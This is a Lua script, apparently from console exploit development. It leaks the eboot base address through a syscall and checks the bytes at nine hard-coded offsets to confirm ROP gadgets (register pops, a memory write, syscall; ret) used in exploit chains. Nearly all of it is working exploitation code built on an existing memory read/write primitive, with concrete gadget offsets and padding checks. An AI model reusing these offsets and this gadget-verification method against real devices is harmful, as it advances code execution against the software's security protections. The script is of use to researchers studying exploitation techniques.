-- CRASH_CLASS: LOW
-- PROBE 531t: Verify all eboot gadgets used in ROP chains
--
-- Read and decode bytes at each gadget offset to confirm they're correct

print("=== PROBE 531t: VERIFY GADGETS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return to_num(v) end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local ebn = eb_hi * 0x100000000 + eb_lo
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

local gadgets = {
    {0x992,    "pop_rax_ret",     {0x58, 0xC3}},           -- pop rax; ret
    {0xC9DFE,  "pop_rdi_ret",     {0x5F, 0xC3}},           -- pop rdi; ret
    {0xD77D,   "pop_rsi_ret",     {0x5E, 0xC3}},           -- pop rsi; ret
    {0x3B02D7, "pop_rdx_ret",     {0x5A, 0xC3}},           -- pop rdx; ret
    {0xE64,    "pop_rcx_ret",     {0x59, 0xC3}},           -- pop rcx; ret
    {0x92C67,  "mov_rdi_rax_ret", {0x48, 0x89, 0x07, 0xC3}}, -- mov [rdi],rax; ret
    {0x42,     "bare_ret",        {0xC3}},                  -- ret
    {0x169,    "pop_rdi_rbp_ret", {0x5F, 0x5D, 0xC3}},     -- pop rdi; pop rbp; ret
    {0x78,     "pop_rsi_rbp_ret", {0x5E, 0x5D, 0xC3}},     -- pop rsi; pop rbp; ret
}

-- Also check fn_addr (syscall; ret)
print("")
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if fn_str then
    local fn_addr = tonumber(fn_str)
    if fn_addr then
        local b0 = rb(fn_addr)
        local b1 = rb(fn_addr + 1)
        print(string.format("fn_addr=0x%X bytes=%02X %02X (expect 0F 05 = syscall)", fn_addr, b0 or 0, b1 or 0))
        local b2 = rb(fn_addr + 2)
        print(string.format("  +2: %02X (expect C3 = ret)", b2 or 0))
    end
end

print("")
for _, g in ipairs(gadgets) do
    local off, name, expected = g[1], g[2], g[3]
    local addr = ebn + off
    local bytes = {}
    local ok = true
    for bi = 0, #expected - 1 do
        local b = rb(addr + bi)
        if b then
            table.insert(bytes, b)
            if b ~= expected[bi + 1] then ok = false end
        else
            table.insert(bytes, -1)
            ok = false
        end
    end

    local hex = ""
    for _, b in ipairs(bytes) do
        if b >= 0 then hex = hex .. string.format("%02X ", b)
        else hex = hex .. "?? " end
    end

    local exp_hex = ""
    for _, b in ipairs(expected) do exp_hex = exp_hex .. string.format("%02X ", b) end

    print(string.format("  +0x%06X %-20s %s %s (expect %s)",
        off, name, ok and "OK" or "BAD", hex, exp_hex))
end

-- Also check if pop_rdi_ret at 0xC9DFE has extra bytes before ret
-- Some "pop rdi; ret" are actually "pop rdi; pop rbp; ret" (5F 5D C3)
local pdr = ebn + 0xC9DFE
local b0 = rb(pdr)
local b1 = rb(pdr + 1)
local b2 = rb(pdr + 2)
print(string.format("\npop_rdi detail: %02X %02X %02X", b0 or 0, b1 or 0, b2 or 0))
if b1 == 0x5D then
    print("  WARNING: this is pop rdi; pop rbp; ret — needs padding!")
end

-- Check pop_rsi_ret detail
local psr = ebn + 0xD77D
b0 = rb(psr)
b1 = rb(psr + 1)
b2 = rb(psr + 2)
print(string.format("pop_rsi detail: %02X %02X %02X", b0 or 0, b1 or 0, b2 or 0))
if b1 == 0x5D then
    print("  WARNING: this is pop rsi; pop rbp; ret — needs padding!")
end

-- Check pop_rdx_ret detail
local pdxr = ebn + 0x3B02D7
b0 = rb(pdxr)
b1 = rb(pdxr + 1)
b2 = rb(pdxr + 2)
print(string.format("pop_rdx detail: %02X %02X %02X", b0 or 0, b1 or 0, b2 or 0))
if b1 == 0x5D then
    print("  WARNING: this is pop rdx; pop rbp; ret — needs padding!")
end

-- Check pop_rcx_ret detail
local pcr = ebn + 0xE64
b0 = rb(pcr)
b1 = rb(pcr + 1)
b2 = rb(pcr + 2)
print(string.format("pop_rcx detail: %02X %02X %02X", b0 or 0, b1 or 0, b2 or 0))
if b1 == 0x5D then
    print("  WARNING: this is pop rcx; pop rbp; ret — needs padding!")
end

print("")
print("=== 531t DONE ===")
